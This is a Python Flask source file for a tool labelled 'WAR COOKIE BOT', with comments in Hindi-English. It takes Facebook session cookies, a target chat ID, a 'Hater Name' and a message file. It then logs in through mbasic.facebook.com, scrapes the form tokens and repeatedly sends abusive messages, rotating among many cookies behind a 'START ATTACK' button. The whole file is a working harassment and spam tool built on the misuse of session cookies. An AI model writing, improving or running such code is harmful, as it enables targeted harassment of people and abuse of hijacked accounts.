from flask import Flask, request, render_template_string
import requests
from threading import Thread, Event
import time
import random
import string
from bs4 import BeautifulSoup

app = Flask(__name__)
app.debug = True

headers = {
    'User-Agent': 'Mozilla/5.0 (Linux; Android 11; TECNO CE7j) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.9',
    'referer': 'https://mbasic.facebook.com/',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'none',
    'upgrade-insecure-requests': '1'
}

stop_events = {}
threads = {}

def send_messages(cookies_list, thread_id, mn, time_interval, messages, task_id):
    stop_event = stop_events[task_id]
    cookie_index = 0
    
    # Universal Thread ID Logic
    # Agar user ne sirf number diya hai (e.g. 10001234), to hum 'cid.c.' laga denge (Personal Chat)
    # Agar user ne group ID diya hai (numbers), to bhi try karega.
    if thread_id.isdigit():
        target_url = f'https://mbasic.facebook.com/messages/read/?tid=cid.c.{thread_id}'
    else:
        # Agar user ne pura link ya kuch aur diya hai
        target_url = f'https://mbasic.facebook.com/messages/read/?tid={thread_id}'

    print(f"[Task {task_id}] Started. Target: {thread_id}", flush=True)

    while not stop_event.is_set():
        for message1 in messages:
            if stop_event.is_set():
                print(f"[Task {task_id}] Stopped by user.", flush=True)
                break
            
            current_cookie = cookies_list[cookie_index % len(cookies_list)]
            
            try:
                session = requests.Session()
                session.headers.update(headers)
                
                # --- Cookie Parsing (Robust) ---
                cookie_dict = {}
                for part in current_cookie.split(';'):
                    if '=' in part:
                        key, value = part.strip().split('=', 1)
                        cookie_dict[key] = value
                session.cookies.update(cookie_dict)

                # --- STEP 1: Check Login (Home Page) ---
                # Pehle check karte hain cookie valid hai ya nahi
                home_resp = session.get('https://mbasic.facebook.com/home.php')
                if 'mbasic_logout_button' not in home_resp.text:
                    print(f"❌ [Task {task_id}] Cookie Invalid or Expired! Login Failed.", flush=True)
                    # Next cookie try karne ke liye continue, ya loop break kar sakte ho
                    # cookie_index += 1
                    # continue 
                    # Abhi ke liye break karte hain taaki logs flood na ho
                    stop_event.set() 
                    break

                # --- STEP 2: Open Chat & Extract Form ---
                response = session.get(target_url)
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Form dhundna jiska action '/send/' ho
                form = soup.find('form', action=lambda x: x and '/messages/send/' in x)
                
                if form:
                    action_url = 'https://mbasic.facebook.com' + form['action']
                    
                    # Hidden inputs (fb_dtsg, jazoest, etc) scrape karna
                    data = {}
                    for input_tag in form.find_all('input', type='hidden'):
                        data[input_tag.get('name')] = input_tag.get('value')
                    
                    # Message Body Prepare
                    full_message = str(mn) + ' ' + message1
                    data['body'] = full_message
                    data['send'] = 'Send'
                    
                    # --- STEP 3: Send Message ---
                    post_response = session.post(action_url, data=data)
                    
                    if post_response.status_code == 200:
                        # Safal hone par wapas redirect hota hai
                        print(f"✅ [Task {task_id}] Sent: {full_message}", flush=True)
                    else:
                        print(f"⚠️ [Task {task_id}] Failed Status: {post_response.status_code}", flush=True)
                else:
                    print(f"❌ [Task {task_id}] Form Not Found! Shayad Thread ID galat hai ya Blocked hai.", flush=True)
                    # Debugging: HTML ka title print kar lo
                    print(f"Page Title: {soup.title.string if soup.title else 'No Title'}", flush=True)

            except Exception as e:
                print(f"❌ [Task {task_id}] Exception: {e}", flush=True)

            # Wait before next message
            time.sleep(time_interval)
            cookie_index += 1

@app.route('/', methods=['GET', 'POST'])
def send_message():
    if request.method == 'POST':
        cookie_option = request.form.get('tokenOption')

        if cookie_option == 'single':
            raw_cookie = request.form.get('singleToken')
            cookies_list = [raw_cookie]
        else:
            token_file = request.files['tokenFile']
            cookies_list = token_file.read().decode().strip().splitlines()

        thread_id = request.form.get('threadId')
        mn = request.form.get('kidx')
        time_interval = int(request.form.get('time'))

        txt_file = request.files['txtFile']
        messages = txt_file.read().decode().splitlines()

        task_id = ''.join(random.choices(string.ascii_letters + string.digits, k=8))

        stop_events[task_id] = Event()
        thread = Thread(target=send_messages, args=(cookies_list, thread_id, mn, time_interval, messages, task_id))
        threads[task_id] = thread
        thread.start()

        return f'Task Started! ID: {task_id} <br><a href="/">Go Back</a>'

    return render_template_string('''
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🔥 Cookies Bot Fix</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css" rel="stylesheet">
  <style>
    body { background-color: #121212; color: #00ff00; font-family: monospace; padding: 20px; }
    .container { max-width: 500px; margin: auto; background: #1e1e1e; padding: 20px; border-radius: 10px; border: 1px solid #00ff00; }
    input, select, button { margin-bottom: 10px; background: #333; color: white; border: 1px solid #555; width: 100%; padding: 8px; }
    button { background: #006600; font-weight: bold; cursor: pointer; }
    h2 { text-align: center; text-shadow: 0 0 5px #00ff00; }
  </style>
</head>
<body>
  <div class="container">
    <h2>🤖 WAR COOKIE BOT 🤖</h2>
    <form method="post" enctype="multipart/form-data">
      
      <label>Select Input Type:</label>
      <select name="tokenOption" id="tokenOption" onchange="toggleInput()">
        <option value="single">Single Cookie</option>
        <option value="multiple">Cookie File</option>
      </select>
      
      <div id="singleInput">
        <label>Paste Cookie (c_user=...; xs=...):</label>
        <input type="text" name="singleToken">
      </div>
      
      <div id="fileInput" style="display:none;">
        <label>Select Cookie File:</label>
        <input type="file" name="tokenFile">
      </div>

      <label>Thread ID (User ID):</label>
      <input type="text" name="threadId" required placeholder="1000123456789">

      <label>Hater Name:</label>
      <input type="text" name="kidx" required placeholder="Ex: Devil">

      <label>Time (Seconds):</label>
      <input type="number" name="time" required value="5">

      <label>Message File:</label>
      <input type="file" name="txtFile" required>

      <button type="submit">🚀 START ATTACK</button>
    </form>

    <hr>
    <form method="post" action="/stop">
      <label>Stop Task ID:</label>
      <input type="text" name="taskId">
      <button type="submit" style="background: #990000;">🛑 STOP</button>
    </form>
  </div>

  <script>
    function toggleInput() {
      var opt = document.getElementById('tokenOption').value;
      if(opt === 'single') {
        document.getElementById('singleInput').style.display = 'block';
        document.getElementById('fileInput').style.display = 'none';
      } else {
        document.getElementById('singleInput').style.display = 'none';
        document.getElementById('fileInput').style.display = 'block';
      }
    }
  </script>
</body>
</html>
''')

@app.route('/stop', methods=['POST'])
def stop_task():
    task_id = request.form.get('taskId')
    if task_id in stop_events:
        stop_events[task_id].set()
        return f'Task {task_id} Stopped.'
    else:
        return f'Task {task_id} Not Found.'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)

